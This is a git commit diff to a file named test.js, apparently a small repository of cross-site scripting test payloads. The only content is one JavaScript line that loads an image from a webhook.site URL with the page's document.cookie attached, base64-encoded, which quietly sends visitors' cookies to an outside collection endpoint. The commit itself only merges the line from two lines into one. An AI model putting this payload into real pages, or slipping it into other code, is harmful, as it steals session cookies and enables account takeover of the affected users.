905e5affaeeb5f13c348de5a2e32d11d81a685ff
Rang3l2 <63368388+Rang3l2@users.noreply.github.com>
2024-06-19 18:02:11 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/14ba119c-22de-4fc4-9904-88e3ac9a689f?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/14ba119c-22de-4fc4-9904-88e3ac9a689f?data='+btoa(document.cookie);
